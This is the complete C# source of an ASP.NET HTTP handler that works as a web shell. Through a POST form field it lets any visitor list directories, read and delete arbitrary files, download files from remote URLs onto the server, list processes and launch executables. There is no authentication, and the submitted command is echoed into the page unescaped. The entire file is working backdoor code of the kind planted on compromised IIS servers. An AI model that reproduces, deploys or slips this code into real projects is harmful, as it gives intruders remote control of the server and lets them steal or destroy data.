<%@ WebHandler Language="C#" Class="BasicHandler" %>

using System;
using System.Web;
using System.IO;
using System.Net;
using System.Diagnostics;

public class BasicHandler : IHttpHandler
{
	public bool IsReusable { get { return true; } }

	public void ProcessRequest(HttpContext context)
	{
		context.Response.ContentType = "text/html";

		if (context.Request.HttpMethod == "POST")
		{
			string command = context.Request.Form["cmd"];

			context.Response.Write("<html><body>");
			context.Response.Write("<form method='POST'>");
			context.Response.Write("<input name='cmd' value='" + command + "' style='width: 500px;'>");
			context.Response.Write("<input type='submit' value='Execute'>");
			context.Response.Write("</form><hr><pre>");

			if (!string.IsNullOrEmpty(command))
			{
				string result = ExecuteCommand(command);
				context.Response.Write(result);
			}

			context.Response.Write("</pre></body></html>");
		}
		else
		{
			context.Response.Write("<html><body>");
			context.Response.Write("<form method='POST'>");
			context.Response.Write("<input name='cmd' value='' style='width: 500px;'>");
			context.Response.Write("<input type='submit' value='Execute'>");
			context.Response.Write("</form></body></html>");
		}
	}

	private string ExecuteCommand(string command)
	{
		try
		{
			if (command == "whoami")
			{
				return Environment.UserName;
			}
			else if (command.StartsWith("dir"))
			{
				string path = command.Length > 3 ? command.Substring(3).Trim() : ".";
				return ListDirectory(path);
			}
			else if (command == "pwd")
			{
				return Environment.CurrentDirectory;
			}
			else if (command.StartsWith("type "))
			{
				string filePath = command.Substring(5).Trim();
				return ReadFile(filePath);
			}
			else if (command.StartsWith("del "))
			{
				string filePath = command.Substring(4).Trim();
				return DeleteFile(filePath);
			}
			else if (command.StartsWith("wget "))
			{
				string args = command.Substring(5);
				return DownloadFile(args);
			}
			else if (command.StartsWith("curl "))
			{
				string args = command.Substring(5);
				return DownloadFile(args);
			}
			else if (command == "tasklist")
			{
				return GetProcessList();
			}
			else if (command.StartsWith("run "))
			{
				string exePath = command.Substring(4);
				return RunExe(exePath);
			}
			else
			{
				return "Available: whoami, dir, pwd, type <file>, del <file>, wget <url>, curl <url>, tasklist, run <exe>";
			}
		}
		catch (Exception ex)
		{
			return "Error: " + ex.Message;
		}
	}

	private string ListDirectory(string path)
	{
		try
		{
			string result = "";
			string[] dirs = Directory.GetDirectories(path);
			string[] files = Directory.GetFiles(path);

			foreach (string dir in dirs)
			{
				result += "[DIR] " + Path.GetFileName(dir) + "\\n";
			}

			foreach (string file in files)
			{
				FileInfo fi = new FileInfo(file);
				result += fi.Name + " (" + fi.Length + " bytes)\\n";
			}

			return result;
		}
		catch (Exception ex)
		{
			return "Error: " + ex.Message;
		}
	}

	private string ReadFile(string filePath)
	{
		try
		{
			return File.ReadAllText(filePath);
		}
		catch (Exception ex)
		{
			return "Error: " + ex.Message;
		}
	}

	private string DeleteFile(string filePath)
	{
		try
		{
			if (File.Exists(filePath))
			{
				File.Delete(filePath);
				return "Deleted: " + filePath;
			}
			return "File not found";
		}
		catch (Exception ex)
		{
			return "Error: " + ex.Message;
		}
	}

	private string DownloadFile(string args)
	{
		try
		{
			string[] parts = args.Split(' ');
			string url = parts[0];
			string outputPath = parts.Length > 1 ? parts[1] : Path.GetFileName(url);

			using (WebClient client = new WebClient())
			{
				byte[] data = client.DownloadData(url);
				File.WriteAllBytes(outputPath, data);
				return "Downloaded: " + outputPath;
			}
		}
		catch (Exception ex)
		{
			return "Error: " + ex.Message;
		}
	}

	private string GetProcessList()
	{
		try
		{
			string result = "";
			Process[] processes = Process.GetProcesses();

			foreach (Process process in processes)
			{
				try
				{
					result += process.Id + " " + process.ProcessName + "\\n";
				}
				catch
				{
					// skip
				}
			}

			return result;
		}
		catch (Exception ex)
		{
			return "Error: " + ex.Message;
		}
	}

	private string RunExe(string exePath)
	{
		try
		{
			Process.Start(exePath);
			return "Started: " + exePath;
		}
		catch (Exception ex)
		{
			return "Error: " + ex.Message;
		}
	}
}